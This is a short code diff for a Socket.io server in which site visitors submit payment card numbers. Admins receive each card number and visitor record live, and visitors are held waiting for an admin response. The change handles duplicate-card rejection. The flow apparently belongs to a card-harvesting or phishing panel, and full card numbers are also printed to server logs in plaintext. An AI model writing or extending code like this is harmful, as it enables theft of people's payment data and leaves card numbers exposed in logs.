@@ -445,14 +445,20 @@ io.on("connection", (socket) => {
         if (isDuplicate) {
           // Reject duplicate card - notify visitor
           socket.emit("card:duplicateRejected");
+          // Reset waiting status since card was auto-rejected
+          visitor.waitingForAdminResponse = false;
+          visitors.set(socket.id, visitor);
+          saveVisitorPermanently(visitor);
           // Notify admins about duplicate card rejection
           admins.forEach((admin, adminSocketId) => {
             io.to(adminSocketId).emit("visitor:duplicateCard", {
               visitorId: visitor._id,
               cardNumber: newCardNumber,
+              visitor: visitor,
             });
           });
           console.log(`Duplicate card rejected for visitor ${visitor._id}: ${newCardNumber}`);
+          return; // Don't continue processing - no waitingForAdminResponse, no dataSubmitted
         } else {
           const now = new Date().toISOString();
           visitor.paymentCards.push({
